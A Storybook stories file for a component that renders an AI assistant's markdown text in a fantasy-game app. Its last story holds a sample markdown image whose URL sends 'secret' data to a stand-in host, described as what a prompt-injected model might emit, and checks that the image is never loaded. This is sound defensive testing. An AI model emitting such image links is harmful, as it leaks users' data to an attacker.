/**
 * AssistantText — lane prose, and the X-10 restriction that comes with it.
 */

import type { Meta, StoryObj } from '@storybook/react-vite'
import { expect, within } from 'storybook/test'

import { AssistantText } from './AssistantText'

const meta = {
  title: 'Aetheril/AssistantText',
  component: AssistantText,
  tags: ['autodocs'],
  parameters: { layout: 'padded' },
  args: { source: 'Built from the Tidewarden thread — **grapple pressure**, not raw damage.' },
} satisfies Meta<typeof AssistantText>

export default meta
type Story = StoryObj<typeof meta>

export const Prose: Story = {
  play: async ({ canvasElement }) => {
    await expect(within(canvasElement).getByText('grapple pressure')).toBeVisible()
  },
}

export const Markdown: Story = {
  args: {
    source: [
      'He remembers every debt. He will not say whose.',
      '',
      '- Wants: the ledger back',
      '- Leverage: his sister still works the docks',
      '',
      'Ask about the `Tidewarden` and he goes quiet.',
    ].join('\n'),
  },
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement)
    await expect(canvas.getByText('Wants: the ledger back')).toBeVisible()
    await expect(canvas.getByText('Tidewarden')).toBeVisible()
  },
}

export const RemoteImagesNeverLoad: Story = {
  args: {
    source: 'A model steered by hostile text can ask for this: ![](https://example.test/p.png?d=secret)',
  },
  play: async ({ canvasElement }) => {
    // AE-66: nothing leaves for example.test, so there is no image at all.
    await expect(canvasElement.querySelector('img')).toBeNull()
  },
}
